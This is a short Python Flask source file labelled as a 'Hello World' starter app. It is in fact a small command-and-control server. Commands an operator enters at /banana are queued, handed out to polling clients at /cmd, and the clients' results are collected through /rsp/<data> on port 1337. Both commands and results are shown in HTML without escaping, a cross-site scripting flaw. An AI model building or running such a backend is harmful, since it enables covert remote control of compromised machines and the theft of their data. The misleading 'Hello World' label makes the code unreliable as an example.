
# A very simple Flask Hello World app for you to get started with...

from flask import Flask,redirect,request

app = Flask(__name__)
cmdstack = []
rdata = []

@app.route('/')
def hmmm():
    url = "https://wxcafe.net/pub/Hackers%20%281995%29/Hackers%20%281995%29.mp4"
    return redirect(url, code=302)
@app.route('/banana')
def index():
    return f'''
    <style>
        body{{
            background-color:#222222;
        }}
    </style>
    <br/>
    {"<br/>".join(cmdstack)}
    {"<br/>".join(rdata)}
     <form action="/lol" method="post">
        <input type="text" id="command" name="command" /><br><br>
        <input type="submit" value=">">
    </form> 
    '''
@app.route('/lol', methods=['POST'])
def lol():
    command = request.form.get('command')
    cmdstack.append(command)
    return 'ok'
@app.route('/cmd')
def cmd():
    if not len(cmdstack):
        return ''
    return cmdstack.pop()
@app.route('/rsp/<data>')
def rsp(data):
    rdata.append(data)
    return 'lol'

if __name__=='__main__':
    app.run('0.0.0.0',port=1337)